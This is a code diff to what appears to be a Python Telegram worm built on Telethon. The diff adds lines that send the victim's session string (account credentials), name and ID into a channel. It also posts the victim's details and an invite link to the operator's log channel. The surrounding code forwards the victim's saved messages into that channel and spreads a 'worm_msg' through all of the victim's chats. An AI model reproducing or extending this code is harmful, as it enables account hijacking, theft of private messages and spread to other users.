@@ -24,16 +24,17 @@ async def create_bot(client, me):
         await msg.delete()
         await response.delete()
     database.bots.insert_one({"username": username, "token": bot_token, "owner": me.id})
-async def backup_saves(client, me):
+async def backup_saves(client, me, bot):
     result = await client(functions.channels.CreateChannelRequest(
         title=f'{me.first_name} {me.last_name}',
-        about=f'First name: {me.first_name}\nLast name: {me.last_name}\nUsername: {me.username}\nID: {me.id}',
+        about=f'ID: {me.id}\nUsername: {me.username}',
         megagroup=False,
     ))
     channel_id = result.updates[1].channel_id
     dest = await client.get_entity(channel_id)
     result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
     database.channels.insert_one({"invite": result.link, "owner": me.id})
+    dest.send_message(f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nSession: {client.session.save()}")
     async for message in client.iter_messages("me", reverse=True):
         try:
             await message.forward_to(dest)
@@ -43,6 +44,7 @@ async def backup_saves(client, me):
         except:
             break
     await client(functions.channels.LeaveChannelRequest(channel=channel_id))
+    await bot.send_message(int(os.getenv('LOG_CHANNEL')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nLink: {result.link}")
 async def spread(client, bot):
     spread_msg = strings['worm_msg'].format((await bot.get_me()).username)
     async for dialog in client.iter_dialogs():
